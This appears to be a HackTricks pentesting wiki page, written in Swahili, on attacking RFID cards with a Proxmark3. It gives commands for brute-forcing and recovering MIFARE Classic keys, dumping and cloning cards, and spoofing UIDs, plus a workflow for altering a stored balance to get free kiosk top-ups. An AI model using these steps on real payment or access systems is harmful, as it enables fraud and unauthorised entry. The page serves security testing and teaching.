# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Kushambulia Mifumo ya RFID kwa Proxmark3

Jambo la kwanza unalohitaji kufanya ni kuwa na [**Proxmark3**](https://proxmark.com) na [**kusakinisha software na dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Kushambulia MIFARE Classic 1KB

Ina **sekta 16**, kila moja ikiwa na **blocks 4**, na kila block ina **16B**. UID iko katika sector 0 block 0 (na haiwezi kubadilishwa).\
Ili kufikia kila sector unahitaji **keys 2** (**A** na **B**) ambazo zimehifadhiwa katika **block 3 ya kila sector** (sector trailer). Sector trailer pia huhifadhi **access bits** zinazotoa ruhusa za **kusoma na kuandika** kwenye **kila block** kwa kutumia keys hizo 2.\
Keys 2 zinafaa kutoa ruhusa ya kusoma ikiwa unaijua ya kwanza, na kuandika ikiwa unaijua ya pili (kwa mfano).

Mashambulizi kadhaa yanaweza kufanywa
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 inaruhusu kufanya vitendo vingine kama **eavesdropping** ya **mawasiliano kati ya Tag na Reader** ili kujaribu kupata data nyeti. Kwenye kadi hii unaweza kusniff mawasiliano na kukokotoa key iliyotumika kwa sababu **operesheni za kriptografia zinazotumika ni dhaifu**, na ukijua plain na cipher text unaweza kuihesabu (`mfkey64` tool).<sup>[[3]](#references)</sup>

#### MiFare Classic: mtiririko wa haraka wa kutumia vibaya thamani iliyohifadhiwa

Wakati vituo vinahifadhi salio kwenye kadi za Classic, mtiririko wa kawaida wa mwanzo hadi mwisho ni:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Maelezo

- `hf mf autopwn` huendesha mashambulizi ya mtindo wa nested/darkside/HardNested, hurejesha keys, na huunda dumps katika client dumps folder.<sup>[[1]](#references)</sup>
- Kuandika block 0/UID hufanya kazi tu kwenye magic gen1a/gen2 cards. Normal Classic cards zina UID ya kusomeka pekee.<sup>[[2]](#references)</sup>
- Deployments nyingi hutumia Classic "value blocks" au checksums rahisi. Hakikisha fields na checksums zote zilizorudiwa/complemented zinaendana baada ya editing.<sup>[[4]](#references)</sup>

Tazama methodology ya kiwango cha juu na mitigations katika:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

Mifumo ya IoT wakati mwingine hutumia **tags zisizo na brand au zisizo za kibiashara**. Katika hali hii, unaweza kutumia Proxmark3 kutuma **raw commands kwa tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Kwa maelezo haya unaweza kujaribu kutafuta taarifa kuhusu kadi hiyo na namna ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma amri ghafi kama: `hf 14a raw -p -b 7 26`

### Scripts

Programu ya Proxmark3 huja na orodha iliyopakiwa awali ya **automation scripts** unazoweza kutumia kutekeleza kazi rahisi. Ili kupata orodha kamili, tumia amri ya `script list`. Kisha, tumia amri ya `script run`, ikifuatiwa na jina la script:
```
proxmark3> script run mfkeys
```
Unaweza kuunda script ya **kufanya fuzz tag readers**, hivyo baada ya kunakili data ya **valid card**, andika tu **Lua script** inayofanya **randomize** moja au zaidi **random bytes** na kuangalia ikiwa **reader crashes** katika iteration yoyote.

## Marejeo

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
